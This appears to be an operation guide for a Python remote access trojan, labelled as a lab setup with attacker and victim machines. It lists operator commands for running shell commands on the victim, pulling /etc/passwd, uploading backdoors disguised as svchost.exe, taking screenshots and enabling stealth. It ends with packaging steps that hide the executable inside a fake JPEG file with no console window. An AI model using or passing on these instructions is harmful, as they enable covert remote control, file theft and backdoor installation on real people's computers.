# Lab Setup Instructions:

On Attacker VM (C2 Server):


pip install pyautogui
python rat_client.py
On Victim VM:


python rat_server.py
Operation Guide:


# Execute command on victim
RAT> shell whoami

# Download file from victim
RAT> download /etc/passwd

# Upload malware to victim
RAT> upload ./payload.exe C:\\Windows\\Temp\\payload.exe

# Capture victim screen
RAT> screenshot

# Remove RAT from victim
RAT> kill

# Exit C2
RAT> exit

# List active sessions
RAT> sessions

# Switch to specific session
RAT> switch abc123

# Take screenshot with custom name
RAT> screenshot victim_desktop.jpg

# Upload with verification
RAT> upload backdoor.exe C:\\Windows\\Temp\\svchost.exe

# Enable stealth mode
RAT> stealth on



# Package Instructions
> pyinstaller --onefile --noconsole --name "image.jpeg" --add-data "image.jpeg;." wrapper.py
>
> $imageBytes = [System.IO.File]::ReadAllBytes("image.jpeg")
> 
> $exeBytes = [System.IO.File]::ReadAllBytes("pyRAT\dist\image.jpeg.exe")
> 
> [System.IO.File]::WriteAllBytes("FINAL_image.jpeg", $imageBytes + $exeBytes)


